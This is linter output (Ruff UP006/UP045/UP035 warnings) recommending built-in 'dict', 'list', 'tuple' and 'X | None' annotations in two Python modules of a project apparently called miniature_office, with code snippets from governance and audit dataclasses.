UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:738:15
    |
737 |     profiles_id: str
738 |     profiles: Dict[str, FloorRuntimeProfile]  # language -> profile
    |               ^^^^
739 |
740 |     def get_profile(self, language: str) -> Optional[FloorRuntimeProfile]:
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\canonical_bundle.py:740:45
    |
738 |     profiles: Dict[str, FloorRuntimeProfile]  # language -> profile
739 |
740 |     def get_profile(self, language: str) -> Optional[FloorRuntimeProfile]:
    |                                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
741 |         """Get the runtime profile for a language."""
742 |         return self.profiles.get(language)
    |
help: Convert to `X | None`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:744:36
    |
742 |         return self.profiles.get(language)
743 |
744 |     def verify_uniformity(self) -> Tuple[bool, List[str]]:
    |                                    ^^^^^
745 |         """Verify all floors have uniform constraints."""
746 |         # Check that critical constraints are uniform across floors
    |
help: Replace with `tuple`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:744:48
    |
742 |         return self.profiles.get(language)
743 |
744 |     def verify_uniformity(self) -> Tuple[bool, List[str]]:
    |                                                ^^^^
745 |         """Verify all floors have uniform constraints."""
746 |         # Check that critical constraints are uniform across floors
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:763:19
    |
761 |     bound_to_resolution: str
762 |     created_at: datetime
763 |     data_formats: List[str]
    |                   ^^^^
764 |     failure_modes: List[str]
765 |     is_active: bool
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:764:20
    |
762 |     created_at: datetime
763 |     data_formats: List[str]
764 |     failure_modes: List[str]
    |                    ^^^^
765 |     is_active: bool
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:778:16
    |
777 |     registry_id: str
778 |     contracts: List[CrossFloorContract]
    |                ^^^^
779 |
780 |     def register_contract(
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:787:23
    |
785 |         directional: bool,
786 |         resolution_id: str,
787 |         data_formats: List[str],
    |                       ^^^^
788 |         failure_modes: List[str],
789 |     ) -> str:
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:788:24
    |
786 |         resolution_id: str,
787 |         data_formats: List[str],
788 |         failure_modes: List[str],
    |                        ^^^^
789 |     ) -> str:
790 |         """Register a new cross-floor contract."""
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:806:51
    |
804 |         return contract.contract_id
805 |
806 |     def get_active_contracts(self, floor: str) -> List[CrossFloorContract]:
    |                                                   ^^^^
807 |         """Get all active contracts for a floor."""
808 |         return [
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:822:18
    |
820 |     contract_id: str
821 |     timestamp: datetime
822 |     divergences: List[str]
    |                  ^^^^
823 |     severity: str
824 |     escalation_triggered: bool
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:837:14
    |
836 |     reports_id: str
837 |     reports: List[ContractDriftReport]
    |              ^^^^
838 |
839 |     def detect_drift(self, contract_id: str) -> ContractDriftReport:
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:868:28
    |
866 |     checksum: str
867 |     trust_score: float
868 |     authorization_history: List[Dict[str, Any]]
    |                            ^^^^
869 |     first_used: datetime
870 |     last_used: datetime
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:868:33
    |
866 |     checksum: str
867 |     trust_score: float
868 |     authorization_history: List[Dict[str, Any]]
    |                                 ^^^^
869 |     first_used: datetime
870 |     last_used: datetime
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:883:12
    |
882 |     ledger_id: str
883 |     tools: Dict[str, ToolProvenanceRecord]  # tool_id -> record
    |            ^^^^
884 |
885 |     def register_tool(
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:936:17
    |
935 |     records_id: str
936 |     exceptions: List[UnsafeCapabilityException]
    |                 ^^^^
937 |
938 |     def grant_exception(
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:960:56
    |
958 |         return exception.exception_id
959 |
960 |     def get_active_exceptions(self, entity_id: str) -> List[UnsafeCapabilityException]:
    |                                                        ^^^^
961 |         """Get active exceptions for an entity."""
962 |         now = datetime.now()
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\canonical_bundle.py:984:15
    |
982 |     content: str
983 |     human_id: str
984 |     response: Optional[str]
    |               ^^^^^^^^^^^^^
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:997:19
    |
996 |     logs_id: str
997 |     interactions: List[ConsigliereInteraction]
    |                   ^^^^
998 |
999 |     def log_interaction(
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
    --> src\app\miniature_office\core\canonical_bundle.py:1004:19
     |
1002 |         content: str,
1003 |         human_id: str,
1004 |         response: Optional[str] = None,
     |                   ^^^^^^^^^^^^^
1005 |     ) -> str:
1006 |         """Log a Consigliere interaction."""
     |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1028:17
     |
1026 |     risk_analysis: str
1027 |     decision: str  # "allow", "deny", "conditional"
1028 |     conditions: List[str]
     |                 ^^^^
1029 |     decided_by: str
     |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1042:16
     |
1041 |     dossiers_id: str
1042 |     decisions: List[SecurityDecision]
     |                ^^^^
1043 |
1044 |     def record_decision(
     |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1049:21
     |
1047 |         risk_analysis: str,
1048 |         decision: str,
1049 |         conditions: List[str],
     |                     ^^^^
1050 |         decided_by: str,
1051 |     ) -> str:
     |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1073:20
     |
1071 |     timestamp: datetime
1072 |     what_bypassed: str
1073 |     cost_incurred: Dict[str, int]
     |                    ^^^^
1074 |     long_term_risk: str
1075 |     justified_by: str
     |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1089:16
     |
1088 |     ledger_id: str
1089 |     overrides: List[Override]
     |                ^^^^
1090 |
1091 |     def record_override(
     |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1094:15
     |
1092 |         self,
1093 |         what_bypassed: str,
1094 |         cost: Dict[str, int],
     |               ^^^^
1095 |         risk: str,
1096 |         justification: str,
     |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1125:25
     |
1123 |     proposal_id: str
1124 |     proposed_change: str
1125 |     simulation_results: List[Dict[str, Any]]
     |                         ^^^^
1126 |     votes: Dict[str, str]
1127 |     outcome: str  # "approved", "rejected"
     |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1125:30
     |
1123 |     proposal_id: str
1124 |     proposed_change: str
1125 |     simulation_results: List[Dict[str, Any]]
     |                              ^^^^
1126 |     votes: Dict[str, str]
1127 |     outcome: str  # "approved", "rejected"
     |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1126:12
     |
1124 |     proposed_change: str
1125 |     simulation_results: List[Dict[str, Any]]
1126 |     votes: Dict[str, str]
     |            ^^^^
1127 |     outcome: str  # "approved", "rejected"
1128 |     timestamp: datetime
     |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1141:17
     |
1140 |     registry_id: str
1141 |     amendments: List[ConstitutionalAmendment]
     |                 ^^^^
1142 |
1143 |     def propose_amendment(
     |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1147:22
     |
1145 |         proposal_id: str,
1146 |         proposed_change: str,
1147 |         simulations: List[Dict[str, Any]],
     |                      ^^^^
1148 |         votes: Dict[str, str],
1149 |         outcome: str,
     |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1147:27
     |
1145 |         proposal_id: str,
1146 |         proposed_change: str,
1147 |         simulations: List[Dict[str, Any]],
     |                           ^^^^
1148 |         votes: Dict[str, str],
1149 |         outcome: str,
     |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1148:16
     |
1146 |         proposed_change: str,
1147 |         simulations: List[Dict[str, Any]],
1148 |         votes: Dict[str, str],
     |                ^^^^
1149 |         outcome: str,
1150 |     ) -> str:
     |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1186:16
     |
1185 |     archive_id: str
1186 |     proposals: List[RejectedProposal]
     |                ^^^^
1187 |
1188 |     def archive_proposal(
     |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1222:27
     |
1221 |     interface_id: str
1222 |     accessible_artifacts: List[str]
     |                           ^^^^
1223 |     access_log: List[Dict[str, Any]]
     |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1223:17
     |
1221 |     interface_id: str
1222 |     accessible_artifacts: List[str]
1223 |     access_log: List[Dict[str, Any]]
     |                 ^^^^
1224 |
1225 |     def grant_audit_access(self, auditor_id: str, artifacts: List[str]) -> str:
     |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1223:22
     |
1221 |     interface_id: str
1222 |     accessible_artifacts: List[str]
1223 |     access_log: List[Dict[str, Any]]
     |                      ^^^^
1224 |
1225 |     def grant_audit_access(self, auditor_id: str, artifacts: List[str]) -> str:
     |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1225:62
     |
1223 |     access_log: List[Dict[str, Any]]
1224 |
1225 |     def grant_audit_access(self, auditor_id: str, artifacts: List[str]) -> str:
     |                                                              ^^^^
1226 |         """Grant audit access to an external auditor."""
1227 |         access_record = {
     |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
    --> src\app\miniature_office\core\canonical_bundle.py:1236:68
     |
1234 |         return access_record["access_token"]
1235 |
1236 |     def get_artifact(self, artifact_id: str, access_token: str) -> Optional[Any]:
     |                                                                    ^^^^^^^^^^^^^
1237 |         """Get an artifact for audit (read-only)."""
1238 |         # Verify access token
     |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1250:26
     |
1248 |     standard: str  # e.g., "ISO-27001", "SOC2"
1249 |     timestamp: datetime
1250 |     evidence_references: List[str]
     |                          ^^^^
1251 |     compliance_status: str
1252 |     gaps: List[str]
     |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1252:11
     |
1250 |     evidence_references: List[str]
1251 |     compliance_status: str
1252 |     gaps: List[str]
     |           ^^^^
     |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1265:14
     |
1264 |     reports_id: str
1265 |     reports: List[ComplianceReport]
     |              ^^^^
1266 |
1267 |     def generate_report(
     |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1268:40
     |
1267 |     def generate_report(
1268 |         self, standard: str, evidence: List[str], status: str, gaps: List[str]
     |                                        ^^^^
1269 |     ) -> str:
1270 |         """Generate a compliance report."""
     |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1268:70
     |
1267 |     def generate_report(
1268 |         self, standard: str, evidence: List[str], status: str, gaps: List[str]
     |                                                                      ^^^^
1269 |     ) -> str:
1270 |         """Generate a compliance report."""
     |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
    --> src\app\miniature_office\core\canonical_bundle.py:1299:16
     |
1297 |     protocol_id: str
1298 |     is_frozen: bool
1299 |     frozen_at: Optional[datetime]
     |                ^^^^^^^^^^^^^^^^^^
1300 |     frozen_by: Optional[str]
1301 |     freeze_reason: str
     |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
    --> src\app\miniature_office\core\canonical_bundle.py:1300:16
     |
1298 |     is_frozen: bool
1299 |     frozen_at: Optional[datetime]
1300 |     frozen_by: Optional[str]
     |                ^^^^^^^^^^^^^
1301 |     freeze_reason: str
1302 |     sealed_state_hash: Optional[str]
     |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
    --> src\app\miniature_office\core\canonical_bundle.py:1302:24
     |
1300 |     frozen_by: Optional[str]
1301 |     freeze_reason: str
1302 |     sealed_state_hash: Optional[str]
     |                        ^^^^^^^^^^^^^
1303 |     access_locked: bool
     |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1306:60
     |
1305 |     def freeze(
1306 |         self, frozen_by: str, reason: str, state_snapshot: Dict[str, Any]
     |                                                            ^^^^
1307 |     ) -> str:
1308 |         """Execute emergency freeze."""
     |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
    --> src\app\miniature_office\core\canonical_bundle.py:1342:18
     |
1340 |     protocol_id: str
1341 |     is_shutdown: bool
1342 |     shutdown_at: Optional[datetime]
     |                  ^^^^^^^^^^^^^^^^^^
1343 |     final_archive_hash: Optional[str]
1344 |     successor_steward: Optional[str]
     |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
    --> src\app\miniature_office\core\canonical_bundle.py:1343:25
     |
1341 |     is_shutdown: bool
1342 |     shutdown_at: Optional[datetime]
1343 |     final_archive_hash: Optional[str]
     |                         ^^^^^^^^^^^^^
1344 |     successor_steward: Optional[str]
1345 |     cryptographic_seal: Optional[str]
     |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
    --> src\app\miniature_office\core\canonical_bundle.py:1344:24
     |
1342 |     shutdown_at: Optional[datetime]
1343 |     final_archive_hash: Optional[str]
1344 |     successor_steward: Optional[str]
     |                        ^^^^^^^^^^^^^
1345 |     cryptographic_seal: Optional[str]
     |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
    --> src\app\miniature_office\core\canonical_bundle.py:1345:25
     |
1343 |     final_archive_hash: Optional[str]
1344 |     successor_steward: Optional[str]
1345 |     cryptographic_seal: Optional[str]
     |                         ^^^^^^^^^^^^^
1346 |
1347 |     def shutdown(
     |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1348:48
     |
1347 |     def shutdown(
1348 |         self, initiated_by: str, archive_data: Dict[str, Any], successor: str
     |                                                ^^^^
1349 |     ) -> str:
1350 |         """Execute clean shutdown."""
     |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1382:26
     |
1381 |     # Core metrics
1382 |     correctness_metrics: Dict[str, str]
     |                          ^^^^
1383 |     completeness_metrics: Dict[str, str]
1384 |     trustworthiness_metrics: Dict[str, str]
     |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1383:27
     |
1381 |     # Core metrics
1382 |     correctness_metrics: Dict[str, str]
1383 |     completeness_metrics: Dict[str, str]
     |                           ^^^^
1384 |     trustworthiness_metrics: Dict[str, str]
     |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1384:30
     |
1382 |     correctness_metrics: Dict[str, str]
1383 |     completeness_metrics: Dict[str, str]
1384 |     trustworthiness_metrics: Dict[str, str]
     |                              ^^^^
1385 |
1386 |     # Anti-patterns (what improvement is NOT)
     |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1387:24
     |
1386 |     # Anti-patterns (what improvement is NOT)
1387 |     forbidden_metrics: List[str]
     |                        ^^^^
1388 |
1389 |     def evaluate_correctness(self, results: Dict[str, Any]) -> Tuple[bool, str]:
     |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1389:45
     |
1387 |     forbidden_metrics: List[str]
1388 |
1389 |     def evaluate_correctness(self, results: Dict[str, Any]) -> Tuple[bool, str]:
     |                                             ^^^^
1390 |         """Evaluate correctness per canonical definition."""
1391 |         # Placeholder for actual evaluation
     |
help: Replace with `dict`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1389:64
     |
1387 |     forbidden_metrics: List[str]
1388 |
1389 |     def evaluate_correctness(self, results: Dict[str, Any]) -> Tuple[bool, str]:
     |                                                                ^^^^^
1390 |         """Evaluate correctness per canonical definition."""
1391 |         # Placeholder for actual evaluation
     |
help: Replace with `tuple`

UP006 [*] Use `dict` instead of `Dict` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1394:46
     |
1392 |         return True, "All correctness criteria met"
1393 |
1394 |     def evaluate_completeness(self, results: Dict[str, Any]) -> Tuple[bool, str]:
     |                                              ^^^^
1395 |         """Evaluate completeness per canonical definition."""
1396 |         return True, "All completeness criteria met"
     |
help: Replace with `dict`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1394:65
     |
1392 |         return True, "All correctness criteria met"
1393 |
1394 |     def evaluate_completeness(self, results: Dict[str, Any]) -> Tuple[bool, str]:
     |                                                                 ^^^^^
1395 |         """Evaluate completeness per canonical definition."""
1396 |         return True, "All completeness criteria met"
     |
help: Replace with `tuple`

UP006 [*] Use `dict` instead of `Dict` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1398:49
     |
1396 |         return True, "All completeness criteria met"
1397 |
1398 |     def evaluate_trustworthiness(self, results: Dict[str, Any]) -> Tuple[bool, str]:
     |                                                 ^^^^
1399 |         """Evaluate trustworthiness per canonical definition."""
1400 |         return True, "All trustworthiness criteria met"
     |
help: Replace with `dict`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1398:68
     |
1396 |         return True, "All completeness criteria met"
1397 |
1398 |     def evaluate_trustworthiness(self, results: Dict[str, Any]) -> Tuple[bool, str]:
     |                                                                    ^^^^^
1399 |         """Evaluate trustworthiness per canonical definition."""
1400 |         return True, "All trustworthiness criteria met"
     |
help: Replace with `tuple`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1477:45
     |
1475 |     metrics_canon: SuccessFailureMetricsCanon
1476 |
1477 |     def verify_bundle_completeness(self) -> Tuple[bool, List[str]]:
     |                                             ^^^^^
1478 |         """Verify all 27 artifacts are present and valid."""
1479 |         missing = []
     |
help: Replace with `tuple`

UP006 [*] Use `list` instead of `List` for type annotation
    --> src\app\miniature_office\core\canonical_bundle.py:1477:57
     |
1475 |     metrics_canon: SuccessFailureMetricsCanon
1476 |
1477 |     def verify_bundle_completeness(self) -> Tuple[bool, List[str]]:
     |                                                         ^^^^
1478 |         """Verify all 27 artifacts are present and valid."""
1479 |         missing = []
     |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
    --> src\app\miniature_office\core\canonical_bundle.py:1792:20
     |
1791 | # Global canonical bundle instance
1792 | _canonical_bundle: Optional[NonDesignCanonicalBundle] = None
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
     |
help: Convert to `X | None`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\miniature_office\core\code_civilization.py:10:1
   |
 8 | from dataclasses import dataclass, field
 9 | from enum import Enum
10 | from typing import Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
11 |
12 | # Import aggressive analysis system
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> src\app\miniature_office\core\code_civilization.py:10:1
   |
 8 | from dataclasses import dataclass, field
 9 | from enum import Enum
10 | from typing import Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
11 |
12 | # Import aggressive analysis system
   |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\code_civilization.py:75:46
   |
74 |     @staticmethod
75 |     def validate_purpose_compliance(context: Dict) -> bool:
   |                                              ^^^^
76 |         """
77 |         Validate that the system is operating within its constitutional purpose.
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\code_civilization.py:140:26
    |
138 |         return self.language == target_language
139 |
140 |     def to_dict(self) -> Dict:
    |                          ^^^^
141 |         return {
142 |             "floor_number": self.floor_number,
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\code_civilization.py:200:18
    |
198 |     source: str  # User provided code
199 |     requested_outcome: RequestedOutcome
200 |     constraints: List[str] = field(default_factory=list)
    |                  ^^^^
201 |
202 |     def to_dict(self) -> Dict:
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\code_civilization.py:202:26
    |
200 |     constraints: List[str] = field(default_factory=list)
201 |
202 |     def to_dict(self) -> Dict:
    |                          ^^^^
203 |         return {
204 |             "directive_id": self.directive_id,
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\code_civilization.py:274:17
    |
272 |     """
273 |
274 |     invariants: List[str] = field(default_factory=list)
    |                 ^^^^
275 |     rejected_reason: Optional[str] = None  # If request is impossible
276 |     approved: bool = False
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\code_civilization.py:275:22
    |
274 |     invariants: List[str] = field(default_factory=list)
275 |     rejected_reason: Optional[str] = None  # If request is impossible
    |                      ^^^^^^^^^^^^^
276 |     approved: bool = False
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\code_civilization.py:279:19
    |
278 |     # Deep analysis results (populated when analyzing existing code)
279 |     ast_analysis: Optional[Dict] = None  # Complete AST report with all details
    |                   ^^^^^^^^^^^^^^
280 |     semantic_issues: Optional[List[Dict]] = None  # All detected semantic problems
281 |     complexity_metrics: Optional[Dict] = None  # Full complexity analysis
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\code_civilization.py:279:28
    |
278 |     # Deep analysis results (populated when analyzing existing code)
279 |     ast_analysis: Optional[Dict] = None  # Complete AST report with all details
    |                            ^^^^
280 |     semantic_issues: Optional[List[Dict]] = None  # All detected semantic problems
281 |     complexity_metrics: Optional[Dict] = None  # Full complexity analysis
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\code_civilization.py:280:22
    |
278 |     # Deep analysis results (populated when analyzing existing code)
279 |     ast_analysis: Optional[Dict] = None  # Complete AST report with all details
280 |     semantic_issues: Optional[List[Dict]] = None  # All detected semantic problems
    |                      ^^^^^^^^^^^^^^^^^^^^
281 |     complexity_metrics: Optional[Dict] = None  # Full complexity analysis
282 |     detected_patterns: Optional[List[Dict]] = None  # All patterns found
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\code_civilization.py:280:31
    |
278 |     # Deep analysis results (populated when analyzing existing code)
279 |     ast_analysis: Optional[Dict] = None  # Complete AST report with all details
280 |     semantic_issues: Optional[List[Dict]] = None  # All detected semantic problems
    |                               ^^^^
281 |     complexity_metrics: Optional[Dict] = None  # Full complexity analysis
282 |     detected_patterns: Optional[List[Dict]] = None  # All patterns found
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\code_civilization.py:280:36
    |
278 |     # Deep analysis results (populated when analyzing existing code)
279 |     ast_analysis: Optional[Dict] = None  # Complete AST report with all details
280 |     semantic_issues: Optional[List[Dict]] = None  # All detected semantic problems
    |                                    ^^^^
281 |     complexity_metrics: Optional[Dict] = None  # Full complexity analysis
282 |     detected_patterns: Optional[List[Dict]] = None  # All patterns found
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\code_civilization.py:281:25
    |
279 |     ast_analysis: Optional[Dict] = None  # Complete AST report with all details
280 |     semantic_issues: Optional[List[Dict]] = None  # All detected semantic problems
281 |     complexity_metrics: Optional[Dict] = None  # Full complexity analysis
    |                         ^^^^^^^^^^^^^^
282 |     detected_patterns: Optional[List[Dict]] = None  # All patterns found
283 |     dependency_graph: Optional[Dict] = None  # Complete dependency structure
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\code_civilization.py:281:34
    |
279 |     ast_analysis: Optional[Dict] = None  # Complete AST report with all details
280 |     semantic_issues: Optional[List[Dict]] = None  # All detected semantic problems
281 |     complexity_metrics: Optional[Dict] = None  # Full complexity analysis
    |                                  ^^^^
282 |     detected_patterns: Optional[List[Dict]] = None  # All patterns found
283 |     dependency_graph: Optional[Dict] = None  # Complete dependency structure
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\code_civilization.py:282:24
    |
280 |     semantic_issues: Optional[List[Dict]] = None  # All detected semantic problems
281 |     complexity_metrics: Optional[Dict] = None  # Full complexity analysis
282 |     detected_patterns: Optional[List[Dict]] = None  # All patterns found
    |                        ^^^^^^^^^^^^^^^^^^^^
283 |     dependency_graph: Optional[Dict] = None  # Complete dependency structure
284 |     design_analysis: Optional[Dict] = None  # MAXIMUM ALLOWED DESIGN analysis
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\code_civilization.py:282:33
    |
280 |     semantic_issues: Optional[List[Dict]] = None  # All detected semantic problems
281 |     complexity_metrics: Optional[Dict] = None  # Full complexity analysis
282 |     detected_patterns: Optional[List[Dict]] = None  # All patterns found
    |                                 ^^^^
283 |     dependency_graph: Optional[Dict] = None  # Complete dependency structure
284 |     design_analysis: Optional[Dict] = None  # MAXIMUM ALLOWED DESIGN analysis
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\code_civilization.py:282:38
    |
280 |     semantic_issues: Optional[List[Dict]] = None  # All detected semantic problems
281 |     complexity_metrics: Optional[Dict] = None  # Full complexity analysis
282 |     detected_patterns: Optional[List[Dict]] = None  # All patterns found
    |                                      ^^^^
283 |     dependency_graph: Optional[Dict] = None  # Complete dependency structure
284 |     design_analysis: Optional[Dict] = None  # MAXIMUM ALLOWED DESIGN analysis
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\code_civilization.py:283:23
    |
281 |     complexity_metrics: Optional[Dict] = None  # Full complexity analysis
282 |     detected_patterns: Optional[List[Dict]] = None  # All patterns found
283 |     dependency_graph: Optional[Dict] = None  # Complete dependency structure
    |                       ^^^^^^^^^^^^^^
284 |     design_analysis: Optional[Dict] = None  # MAXIMUM ALLOWED DESIGN analysis
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\code_civilization.py:283:32
    |
281 |     complexity_metrics: Optional[Dict] = None  # Full complexity analysis
282 |     detected_patterns: Optional[List[Dict]] = None  # All patterns found
283 |     dependency_graph: Optional[Dict] = None  # Complete dependency structure
    |                                ^^^^
284 |     design_analysis: Optional[Dict] = None  # MAXIMUM ALLOWED DESIGN analysis
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\code_civilization.py:284:22
    |
282 |     detected_patterns: Optional[List[Dict]] = None  # All patterns found
283 |     dependency_graph: Optional[Dict] = None  # Complete dependency structure
284 |     design_analysis: Optional[Dict] = None  # MAXIMUM ALLOWED DESIGN analysis
    |                      ^^^^^^^^^^^^^^
285 |
286 |     def to_dict(self) -> Dict:
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
